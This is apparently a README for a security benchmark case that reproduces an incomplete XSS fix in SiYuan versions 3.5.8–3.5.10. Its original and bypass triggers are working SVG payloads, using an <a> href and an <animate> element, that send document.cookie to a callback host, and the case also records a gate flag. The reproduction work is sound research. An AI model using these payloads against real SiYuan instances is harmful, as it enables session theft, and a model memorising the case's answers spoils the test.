# siyuan-cve-2026-31807

SiYuan — CVE-2026-29183 -> CVE-2026-31807 (the 3.5.9 fix replaces
`RemoveScriptsInSVG` with `SanitizeSVG`, which strips static `javascript:` hrefs
and `on*` attributes at PARSE time, but SVG `<animate>`/`<set>` elements modify
attributes at RUNTIME and are not in the blocklist — `<animate attributeName="href"
values="javascript:...">` sets the anchor's href after sanitization; Reflected
XSS; case.json root_cause `Reflected_XSS`, no CWE ID). **Genuine incomplete fix;
gate passed on real Docker over EXTERNAL HTTP with a real headless-browser
victim.**

不完全修复分析见 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Official SiYuan kernel images (`b3log/siyuan:v3.5.8` / `v3.5.9` / `v3.5.10`). The
unauthenticated `GET /api/icon/getDynamicIcon?type=8&content=...` reflects user
content into an SVG served as `image/svg+xml`. XSS-exfil canary: a headless
Chromium `victim` service (playwright image, `victim.py`) carries `${PCB_FLAG}` in
a siyuan-origin cookie, NAVIGATES the returned SVG as a document (not `<img>`),
clicks the reflected `<a>`, and the `javascript:` URL reads `document.cookie` and
exfiltrates to the internal `callback` service (`/c?f=` / `/dump`) — flag token in
the exfil callback is the detector.

GHSA-5hc8-qmg8-pw27 (case.json `evidence.incomplete_fix_quote`): "The sanitizer
checks attributes on elements at parse time. SVG <animate> and <set> elements
modify attributes at runtime - these elements are not in the sanitizer's
blocklist." `patch_real.diff` is the CVE-2026-29183 fix (commit
`d68bd5a79391742b3cb2e14d892bdd9997064927`: `RemoveScriptsInSVG` -> `SanitizeSVG`
in `kernel/api/icon.go`, `kernel/server/serve.go`, `kernel/util/misc.go`). The
v3.5.10 fix adds animate/animatetransform/animatecolor/animatemotion/set to the
blocklist (compare v3.5.9...v3.5.10).

- **V0 = 3.5.8** (`:56830`) — `RemoveScriptsInSVG` only strips `<script>`; the
  seed's static `<a href="javascript:location='<CB>'+document.cookie">` survives
  -> victim click exfiltrates the flag (repro.log: reaches).
- **V1 = 3.5.9** (`:56831`, target) — `SanitizeSVG` BLOCKS the static seed (href
  stripped), but the residual wraps the payload in
  `<a><animate attributeName="href" values="javascript:location='<CB>'+document.cookie" begin="0s" fill="freeze"/>...</a>`
  — SMIL writes the href at t=0 after sanitization -> click -> flag. Incomplete fix.
- **V2 = 3.5.10** (`:56832`, 31807 fix) — `animate`/`set` removed -> blocked
  (repro.log; `_env_ready` all true).

- **Original trigger**: `GET /api/icon/getDynamicIcon?type=8&color=blue&content=</text><a href="javascript:location='<CB>'+document.cookie"><text>c</text></a><text>`
  (URL-encoded; `poc/original_poc.py` `payload`), then
  `GET /visit?target=<icon-url>&origin=<siyuan>` on the victim.
- **Residual trigger**: same endpoint with
  `content=</text><a><animate attributeName="href" values="javascript:location='<CB>'+document.cookie" begin="0s" fill="freeze"/><text x="256" y="256" font-size="60">click</text></a><text>`
  (`_heldout/bypass_poc.py` `payload`). NOT CVE-2026-31809 CR-in-scheme (that is
  PCBV2-0194).

Run: `python3 oracle.py --run-gate --with-v2` (gate, flag
`PCBFLAG_3c4cfa1fb0079e210c02dafed80c6c64`: seed reaches@v0 / seed blocked@v1 /
residual reaches@v1 / residual blocked@v2; passed=true; end-to-end headless
Chromium click -> `document.cookie` exfil). See `repro.log` and `case.json`.

> NOTE: per INCOMPLETE_FIX_ANALYSIS.md, the inputs-side `v0_to_v1.diff` for this
> case wrongly attributes the 3.5.10 animate-element deletion to the 3.5.8->3.5.9
> change — the REAL v3.5.9 `SanitizeSVG` has no animate removal (the case was
> built against GitHub tags, not that diff).
